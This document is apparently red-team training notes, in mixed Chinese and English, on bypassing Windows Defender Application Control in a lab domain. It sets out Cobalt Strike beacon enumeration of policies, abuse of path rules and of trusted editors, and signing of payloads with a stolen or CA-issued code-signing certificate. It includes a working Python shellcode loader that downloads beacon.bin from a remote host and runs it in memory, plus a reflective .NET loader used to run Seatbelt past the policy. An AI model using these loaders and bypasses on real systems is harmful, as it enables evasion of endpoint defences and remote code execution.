# Windows Defender Application Control

> WDAC是一项Windows技术，旨在控制哪些驱动程序和应用程序被允许在机器上运行。 它听起来很像AppLocker，但有几个关键的区别。 其中最重要的是，微软承认WDAC是一个官方安全边界。 这意味着WDAC大大地更强大，适用的绕过方法实际上是被修复的（而且通常向发现者发出CVE）。(WDAC is a Windows technology designed to control which drivers and applications are allowed to run on a machine.  It sounds a lot like AppLocker, but with a few key differences.  The most significant of which is that Microsoft recognises WDAC as an [official security boundary](https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria).  This means that WDAC is substantially more robust and applicable bypasses are actually fixed (and a CVE often issued to the finder).)


WDAC 策略文件在：```C:\Windows\schemas\CodeIntegrity\ExamplePolicies```


枚举
```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainGPO -Name *WDAC* -Properties GpcFileSysPath

gpcfilesyspath                                                                              
--------------                                                                              
\\redteamops2.local\SysVol\redteamops2.local\Policies\{36C8DC4C-6B44-4EEB-9099-CA0E050DD6DE}

beacon> download \\redteamops2.local\SysVol\redteamops2.local\Policies\{36C8DC4C-6B44-4EEB-9099-CA0E050DD6DE}\Machine\Registry.pol
[*] started download of \\redteamops2.local\SysVol\redteamops2.local\Policies\{36C8DC4C-6B44-4EEB-9099-CA0E050DD6DE}\Machine\Registry.pol (448 bytes)
[*] download of Registry.pol is complete
```


使用Parse-PolFile命令解析文件
```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName     : SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
ValueName   : DeployConfigCIPolicy
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
ValueName   : ConfigCIPolicyFilePath
ValueType   : REG_SZ
ValueLength : 116
ValueData   : \\redteamops2.local\SYSVOL\redteamops2.local\CIPolicy.p7b
```

ValueData 字段包含 WDAC 策略本身的位置

下载具体的WDAC策略文件
```
beacon> download \\redteamops2.local\SYSVOL\redteamops2.local\CIPolicy.p7b
[*] started download of \\redteamops2.local\SYSVOL\redteamops2.local\CIPolicy.p7b (2360 bytes)
[*] download of CIPolicy.p7b is complete
```


[CIPolicyParser.ps1](https://gist.github.com/mattifestation/92e545bf1ee5b68eeb71d254cec2f78e)可以将这种二进制格式转换回 XML 以便于阅读

```
PS C:\Users\Administrator\Desktop> ipmo C:\Tools\CIPolicyParser.ps1
PS C:\Users\Administrator\Desktop> ConvertTo-CIPolicy -BinaryFilePath .\CIPolicy.p7b -XmlFilePath policy.xml
```

当涉及到信任应用程序时，WDAC 允许非常细粒度的控制。最常用的控制包括:

1. Hash - allows binaries to run based on their hash values.
2. FileName - allows binaries to run based on their original filename.
3. FilePath - allows binaries to run from specific file path locations.
4. Publisher - allows binaries to run that are signed by a particular CA.

# Living Off The Land Binaries, Scripts and Libraries

> 有许多本地Windows二进制文件和脚本可以用来执行任意代码。 这些可以用来绕过信任签名的Windows应用程序的WDAC策略。 微软积极维护一个推荐的[阻断名单](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)来对付这些东西，各组织应该实施。 这种规则的一个例子：(There are many native Windows binaries and scripts that can be used to execute arbitrary code.  These can be used to bypass a WDAC policy which trusts signed Windows applications.  Microsoft actively maintains a recommended blocklist to combat these, which organisations should implement.  An example of such a rule:)

```
 <FileRules>
    <Deny ID="DENY_MSBUILD" FriendlyName="MSBuild.exe" FileName="MSBuild.Exe" MinimumFileVersion="65535.65535.65535.65535"/>
  </FileRules>
```

[终极 WDAC bypass列表](https://github.com/bohops/UltimateWDACBypassList)


# Wildcard FilePaths

> 文件路径规则中的通配符可能相当危险（原因很明显）。 例如，这个规则将允许C:\Temp\内的任何东西执行（假设C是操作系统的驱动器）：(Wildcards in FilePath rules can be quite dangerous (for obvious reasons).  For example, this rule would allow anything inside C:\Temp\ to execute (assuming C was the OS drive):)

```
<Allow ID="ID_ALLOW_A_2_2" FriendlyName="Temp FileRule" MinimumFileVersion="0.0.0.0" FilePath="%OSDRIVE%\Temp\*" />
```


**Runtime FilePath Rule Protection**

> 然而，在默认情况下，WDAC启用了一个名为Runtime FilePath Rule Protection的策略设置。 这是一个重要的规则，因为它只允许对只有管理员才能写入的路径实施FilePath规则。 因此，在上面的例子中，如果C:\Temp\是标准用户可写的，WDAC将不允许应用这一规则，任何东西都不会从这个目录执行。(However, by default, WDAC has a policy setting enabled called Runtime FilePath Rule Protection.  This is an important rule, as it only permits FilePath rules for paths that are only writable by administrators.  So in the example above, if C:\Temp\ was writable by standard users, WDAC would not allow this rule to be applied and nothing would execute from this directory at all.)

> 如果这个目录只有管理员可以写，那么他们就可以通过丢弃和执行恶意的东西来绕过WDAC。 普通用户仍然能够从该目录中执行，但不能写到该目录。 如果与另一个滥用原素相结合，如任意特权写入漏洞，他们仍然可以绕过WDAC。(If the directory was only writable by administrators, then they could bypass WDAC by dropping and executing something malicious.  Standard users would still be able to execute from the directory, but not write to it.  They could still bypass WDAC if combined with another abuse primitive, such as an arbitrary privileged write vulnerability.)

禁用此设置
```
<Rule>
  <Option>Disabled:Runtime FilePath Rule Protection</Option>
</Rule>
```

这将允许应用FilePath规则，即使该目录可以被标准用户写入。


# User Modifiable Binaries

没有签名的应用程序通常被允许根据其完整路径执行。 例如，这个演示二进制文件在C:\Program Files\LegitApp\。

```
<FileRules>
  <Allow ID="ID_ALLOW_A_1" FriendlyName="LegitApp.exe FileRule" MinimumFileVersion="0.0.0.0" FilePath="C:\Program Files\LegitApp\LegitApp.exe" />
  <Allow ID="ID_ALLOW_A_2" FriendlyName="LegitApp.dll FileRule" MinimumFileVersion="0.0.0.0" FilePath="C:\Program Files\LegitApp\LegitApp.dll" />
</FileRules>
```

枚举这个规则
```
PS C:\> Get-AuthenticodeSignature -FilePath 'C:\Program Files\LegitApp\*' | ft

SignerCertificate                         Status                                 Path
-----------------                         ------                                 ----
                                          NotSigned                              LegitApp.exe
                                          NotSigned                              LegitApp.dll
```


>如果一个用户有权限修改/替换这些文件，它仍然会被允许执行，因为文件路径仍然是相同的，这就是被检查的全部内容。对于一个普通用户来说，这是不可能的，但对于一个本地管理员来说，这是有可能的，而且一些应用程序被安装在用户可写入的位置，如AppData。( If a user had permission to modify/replace either of these files, it would still be allowed to execute because the file path is still the same, and that's all that's being checked.  It would be quite unlikely for a standard user but possible for a local admin, and some applications are installed in user-writable locations, such as AppData.)

```
PS C:\> Get-Acl -Path 'C:\Program Files\LegitApp\LegitApp.dll' | select -expand Access

FileSystemRights  : Modify, Synchronize
AccessControlType : Allow
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
```

# Trusted Applications

 Visual Studio Code、 Sublime Text 和 Notepad++这些工具有代码执行能力，因此也可以利用来绕过wdac
 
 
枚举sublime的核心组件
 
```
PS C:\Users\hdoyle> ls 'C:\Program Files\Sublime Text\' -Include *.exe, *.dll -Recurse | Get-AuthenticodeSignature

SignerCertificate                         Status                                     Path
-----------------                         ------                                     ----
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      crash_reporter.exe
                                          NotSigned                                  libcrypto-1_1-x64.dll
                                          NotSigned                                  libssl-1_1-x64.dll
9617094A1CFB59AE7C1F7DFDB6739E4E7C40508F  Valid                                      msvcr100.dll
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      plugin_host-3.3.exe
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      plugin_host-3.8.exe
                                          NotSigned                                  python33.dll
                                          NotSigned                                  python38.dll
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      subl.exe
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      sublime_text.exe
28173C6A166FB89E4A17C4D58CD83B46BDC226BB  UnknownError                               unins000.exe
834F29A60152CE36EB54AF37CA5F8EC029ECCF01  Valid                                      update_installer.exe
62009AAABDAE749FD47D19150958329BF6FF4B34  Valid                                      vcruntime140.dll
```

因此，组织通常会使用 "后备 "策略，以允许这些策略运行。 主要的信任级别通常是Publisher，而后备的信任级别通常是Hash或FilePath。

A Publisher rule for Sublime could look like this:

```
<Signer ID="ID_SIGNER_S_1" Name="Sectigo RSA Code Signing CA">
  <CertRoot Type="TBS" Value="20ADC5B59CB532E215F01BA09A9C745898C206555613512FEA7C295CCFD17CED4FE2C5BC3274CA8A270FC68799B8343C" />
  <CertPublisher Value="Sublime HQ Pty Ltd" />
</Signer>
```

Fallback Hash rules for python38.dll like this:

```
  <FileRules>
    <Allow ID="ID_ALLOW_A_D" FriendlyName="C:\Program Files\Sublime Text\python38.dll Hash Sha1" Hash="07F2BD05F877852F5AA016487CB0B23D7F0F0947" />
    <Allow ID="ID_ALLOW_A_E" FriendlyName="C:\Program Files\Sublime Text\python38.dll Hash Sha256" Hash="FB046BF518AA8C1CCEE19483AE35F41C7A235AF6358FAD3736FF7EFE5C63DE56" />
    <Allow ID="ID_ALLOW_A_F" FriendlyName="C:\Program Files\Sublime Text\python38.dll Hash Page Sha1" Hash="203F80E93E6BFD4BB4046A0FE03332348BCC7241" />
    <Allow ID="ID_ALLOW_A_10" FriendlyName="C:\Program Files\Sublime Text\python38.dll Hash Page Sha256" Hash="024CE702ACD7F513513F68B569C7BD5E8CC47B78401E2186B75D14B56955B96E" />
  </FileRules>
```

And a fallback FilePath rule for python38.dll like this:

```
<FileRules>
  <Allow ID="ID_ALLOW_A_14" FriendlyName="C:\Program Files\Sublime Text\python38.dll FileRule" MinimumFileVersion="0.0.0.0" FilePath="C:\Program Files\Sublime Text\python38.dll" />
</FileRules>
```

下面存放在 ```%AppData%\Sublime Text\Packages\calc.py```的代码可以弹出一个计算器
```
import subprocess
subprocess.call('C:\\Windows\\System32\\calc.exe')
```

这是一个使用python返回shell的[例子](https://gist.github.com/peewpw/8054a64eb4b5cd007a8431a71d698dc3#:~:text=Raw-,shellcode_x64.py,-%23%2064%20bit%20compatible)

教程修改上面例子，远程加载shell code

这里使用到了requests模块，有可能在lab环境中未安装，可以把requests.py放到下面代码的同级目录
```
import ctypes
import requests

url = 'http://10.10.5.39/beacon.bin'
r = requests.get(url, stream=True, verify=False)
scbytes = r.content

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.CreateThread.argtypes = (ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))

mem = ctypes.windll.kernel32.VirtualAlloc(
	ctypes.c_int(0),
	ctypes.c_int(len(scbytes)),
	ctypes.c_int(0x3000),
	ctypes.c_int(0x40)
	)

buf = (ctypes.c_char * len(scbytes)).from_buffer_copy(scbytes)

ctypes.windll.kernel32.RtlMoveMemory(
	ctypes.c_void_p(mem),
	buf,
	ctypes.c_int(len(scbytes))
	)

handle = ctypes.windll.kernel32.CreateThread(
	ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.c_void_p(mem),
	ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.pointer(ctypes.c_int(0))
	)
```

# Trusted Signers

这章讲被信任的签名证书

一些组织建立和维护他们自己的自定义LOB应用程序，这些应用程序可能使用内部的证书授权，如活动目录证书服务来签署。 这些CA可以被他们的WDAC政策所信任，以允许他们签署和部署他们自己的可信应用程序。

WDAC有两个级别的证书策略（如果算上Root，则是三个，但目前不支持）。 第一个是Leaf，第二个是PCA（Private Certificate Authority的缩写）。 Leaf在个人签名证书级别添加受信任的签名者，PCA在链中添加最高的可用证书（通常是根证书下面的一个证书）。

Leaf提供了更精细的控制，因为每一个签发的代码签名证书都必须被单独信任，但显然需要更多的管理开销。 PCA的健壮性较差，但更容易管理，因为由CA签发的任何代码签名证书只需一条规则就能得到WDAC的信任。


## Leaf

Workstation 3 上的SignedApp.exe使用由redteamops2.local CA签发的 "SignedApp "证书签名。

1684145535617.jpg

Leaf 证书规则如下所示:

```
<Signers>
  <Signer ID="ID_SIGNER_S_1" Name="SignedApp">
    <CertRoot Type="TBS" Value="368FEB688B0C60E99D410D4F70B4C952B2741D263C408AE2FBB84C56C15525B5" />
  </Signer>
</Signers>
```

Pca證书规则如下：
```
<Signers>
  <Signer ID="ID_SIGNER_S_1" Name="Red Team Ops 2 Sub CA">
    <CertRoot Type="TBS" Value="0118C2C3108850353E71D0253A730747A266FDC0AA433A3FF5E087D10C199A73" />
  </Signer>
</Signers>
```

如果你能找到导出的私钥（.pfx）和相关的密码，你可以简单地使用Windows SDK中的signtool.exe来用它签署任何二进制文件。

```
signtool.exe sign /f SignedAppCert.pfx /p password /fd SHA256 EvilApp.exe
```
 


## PCA

让 CA 签署我们自己的证书签名请求

 Cobalt Strike可以使用这样的证书来自动生成签名的有效载荷。 当安装了网络注册角色时，这可能特别容易实现。
 
 1684145603747.jpg
 
1. 首先，创建一个Java KeyStore并完成信息字段

```
ubuntu@teamserver ~> keytool -genkey -alias server -keyalg RSA -keysize 2048 -keystore keystore.jks
Enter keystore password:
Re-enter new password:
What is your first and last name?
  [Unknown]:  HelpSystems LLC
What is the name of your organizational unit?
  [Unknown]:  Hacker Squad
What is the name of your organization?
  [Unknown]:  HelpSystems LLC
What is the name of your City or Locality?
  [Unknown]:  Eden Prairie
What is the name of your State or Province?
  [Unknown]:  MN
What is the two-letter country code for this unit?
  [Unknown]:  US
Is CN=HelpSystems LLC, OU=Hacker Squad, O=HelpSystems LLC, L=Eden Prairie, ST=MN, C=US correct?
  [no]:  yes
```

2. 生成签名
```
ubuntu@teamserver ~> keytool -certreq -alias server -file req.csr -keystore keystore.jks
Enter keystore password:

ubuntu@teamserver ~> cat req.csr
-----BEGIN NEW CERTIFICATE REQUEST-----
MIIC8TCCAdkCAQAwfDELMAkGA1UEBhMCVVMxCzAJBgNVBAgTAk1OMRUwEwYDVQQH
EwxFZGVuIFByYWlyaWUxGDAWBgNVBAoTD0hlbHBTeXN0ZW1zIExMQzEVMBMGA1UE
CxMMSGFja2VyIFNxdWFkMRgwFgYDVQQDEw9IZWxwU3lzdGVtcyBMTEMwggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCJuDtP/bn4y9Ha6J+Cp/ywjGxtvVET
K1do5eflb3gBxSQIqjZ5cxKZyCsiyCG3ALkbcxXsDRFQBElQWTu5ijyRhaLHOmvd
2CH6Bj+VmSqjuYHgBoIfzM5QKYs+uAdAGzveFwVyrjfL+4fj5TEu5XnnLp4d+L5n
vthpM4ABaaVPk82mlkWpDqlxp2LNp33ZPi9yUiMAkGSoBtWUEl9zXXl3G7jz+Tmd
KVxcqRpwVpJ1ibMZ/w9GcWDxTpPjlNIEDwLRFaJyPTXcoa84Xmm4ow7CHWJpOn7R
kXyR8wB4BTY5m+Tl7cFN8CqCNnCWumnYpls2ol3k771hS4ZB6yK6VIq5AgMBAAGg
MDAuBgkqhkiG9w0BCQ4xITAfMB0GA1UdDgQWBBSo06E0GI83Cdb9aBy68TGozbDV
6zANBgkqhkiG9w0BAQsFAAOCAQEAVLZXnnAgnErJ2NUQC2YFzVVyKXI4sRipxXX9
ZzVMOtm3+Z85Cf4/N2Zn7lgaOnkj+70dHSUxTzj+aj083dewGIWoqCgikbkPgNYs
dNslS4dhXqHM68anYUsRTiNqJ5QAYujmRwxWIVO/6WX6nRDA2ZnNS9cMz1Nt3+zZ
YPf5vJp3EmBU2fi3Eg3VHT/LAVoA441Yqfywg99JT3oB7ERw1BvLJ1VTSPBNbKcE
sToMLXbgJ3HMBZzAiwZaDpUT+KJ7oV4z/H+HFMThASPVy+tTBEONiqwuNIflvxcO
ILYhBwhe7NaYsTvruS3wAogSH9sSg2yVesJ786eKTR5B4eyOfw==
-----END NEW CERTIFICATE REQUEST-----
```

3. 申请证书

来到：```http://ca.redteamops2.local/certsrv```，依次点击 ```Request a certificate``` > ```advanced certificate request```，把上面生成的签名复制进去，并且选择 ```Red Team Ops 2 Code Signing```，然后单击提交

1684145794004.jpg

你会被转到证书颁发的页面，在那里你可以下载证书。 选择下载证书链，你的浏览器将下载certnew.p7b

1684145856208.jpg

4. 将这个文件转移到你的teamserver服务器虚拟机上，并将其导入keystore

```
ubuntu@teamserver ~> keytool -import -trustcacerts -alias server -file certnew.p7b -keystore keystore.jks
Enter keystore password:

Top-level certificate in reply:

Owner: CN=Red Team Ops 2 Root CA, DC=redteamops2, DC=local
Issuer: CN=Red Team Ops 2 Root CA, DC=redteamops2, DC=local
Serial number: 421987c30cad5faa4854f955aca0717b
Valid from: Thu Feb 03 13:50:33 UTC 2022 until: Sun Feb 03 14:00:33 UTC 2047
Certificate fingerprints:
         SHA1: 88:F6:3E:1F:68:88:DD:C7:5C:C0:DC:C2:F4:F0:2B:C8:31:6C:B1:3E
         SHA256: 8C:21:38:A0:5E:B9:F8:1B:DF:DB:37:49:87:73:50:97:F2:C8:E5:9B:FC:31:70:55:93:4E:AC:37:DC:56:15:70
Signature algorithm name: SHA256withRSA
Subject Public Key Algorithm: 2048-bit RSA key
Version: 3

[...snip...]

... is not trusted. Install reply anyway? [no]:  yes
Certificate reply was installed in keystore
```


5. 将keystore.jks复制到cobaltstrike目录

然后将以下代码块添加到你的Malleable C2配置文件：

```
code-signer {
        set keystore "keystore.jks";
        set password "password";
        set alias "server";
}
```

6. 重启teamserver服务器，并且重新生成exe payload

1684146016300.jpg

7. 执行

1684146051136.jpg

1684146070339.jpg


# Exploiting Vulnerable Applications


最有可能导致WDAC绕过的漏洞类型是代码在受信任应用程序 "内部 "执行的漏洞（The type of vulnerability that is most likely to result in a WDAC bypass is one where code is executed "inside" the trusted application.）


下面是一个通过C#反射加载，执行我们指定程序的例子

```
using System.IO;
using System.Reflection;

namespace VulnerableApp;

internal static class Program
{
    public static void Main(string[] args)
    {
        var bytes = File.ReadAllBytes(args[0]);
        var asm = Assembly.Load(bytes);

        asm.EntryPoint.Invoke(null, new object[]
        {
            new string[] { }
        });
    }
}
```


直接执行Seatbelt报错
通过反射加载，执行Seatbelt成功
```
PS C:\Users\hdoyle> .\Desktop\Seatbelt.exe
Program 'Seatbelt.exe' failed to run: Your organization used Device Guard to block this app.

PS C:\Users\hdoyle> & 'C:\Program Files\VulnerableApp\VulnerableApp.exe' .\Desktop\Seatbelt.exe

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.1.1         ,(((&%%%%%%%%%%%%%%%%%,>
                         #%%%%##,
```